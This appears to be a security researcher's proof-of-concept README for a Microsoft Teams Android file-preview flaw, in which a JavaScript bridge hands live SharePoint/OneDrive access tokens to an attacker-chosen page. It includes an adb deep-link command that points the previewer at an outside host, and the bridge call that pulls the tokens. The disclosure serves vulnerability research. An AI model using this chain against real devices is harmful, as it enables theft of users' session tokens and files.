# Teams Android File Preview Bridge Analysis — Reproduction PoC

**Target:** `com.microsoft.teams` (Android, v1416 / 1.0.0.2026202302)  
**Component:** `com.microsoft.skype.teams.files.open.views.JsApiWebViewManager`  
**Researcher:** Abel Ochieng (Independent Security Researcher)  
**Live Netlify Edge Host:** https://cosmic-dusk-cc5c4b.netlify.app/

---

## Overview

This repository hosts the reproduction probe and automation scripts demonstrating unvalidated JavaScript interface registration (`AndroidBridge`) within the Teams Android file previewer component (`OwlFilePreviewFragment` / `JsApiWebViewManager`).

## Reproduction Steps

1. **Verify Live Web Probe:**  
   The probe page is hosted live at [https://cosmic-dusk-cc5c4b.netlify.app/](https://cosmic-dusk-cc5c4b.netlify.app/).  
   The source is available in `index.html`. It registers `window.jsApiNativeBridge.onResponse` and queries `window.AndroidBridge.postMessage('{"method":"fileToLoad"}')`.

2. **Trigger File Preview via ADB:**
   ```bash
   adb shell am start -n com.microsoft.teams/com.microsoft.skype.teams.views.activities.SplashActivity \
     -a android.intent.action.VIEW \
     -d "msteams://teams.microsoft.com/l/file/test_file_id?fileType=docx&objectUrl=https%3A%2F%2Fcosmic-dusk-cc5c4b.netlify.app"
   ```

3. **Automated Reproduction Script:**
   ```bash
   bash run_poc.sh
   ```

## Bridge Mechanism

- Native code binds the WebView base URL to the scheme/host of `objectUrl` without restricting external domains:
  `loadDataWithBaseURL(baseUrl, htmlContent, "text/html", "UTF-8", baseUrl)`
- The native bridge is added globally:
  `webView.addJavascriptInterface(new JsApiPreviewerInterface(), "AndroidBridge")`
- Calling `fileToLoad` triggers `handleFileToLoad`, which returns the live SharePoint/OneDrive WOPI session (`accessToken`, `wopiSrc`, `accessTokenExpiry`) directly into the web execution context.
